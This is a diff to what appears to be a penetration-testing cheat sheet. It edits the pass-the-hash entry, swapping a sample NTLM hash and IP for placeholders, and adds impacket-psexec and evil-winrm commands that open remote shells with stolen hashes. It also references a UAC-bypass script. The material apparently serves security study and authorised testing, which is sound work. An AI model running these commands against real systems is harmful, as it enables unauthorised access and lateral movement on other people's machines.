@@ -311,11 +311,17 @@ https://raw.githubusercontent.com/winscripting/UAC-bypass/master/FodhelperBypass
 #### Pass the Hash
 -> Allows an attacker to authenticate to a remote system or service via a user's NTLM hash
 ```
-pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
+pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:<hash_ntlm> //<ip> cmd
 ```
--> Remote Access 
+
+-> Remote Access - impacket-psexec  
 ```
 impacket-psexec '<hostname>/<user>'@<ip> -hashes ':<hash>'
+```
+
+-> Remote Access + evil-winrm  
+```
+evil-winrm -i <ip> -u <user> -H <hash>
 ```
 
 #### Over Pass the Hash
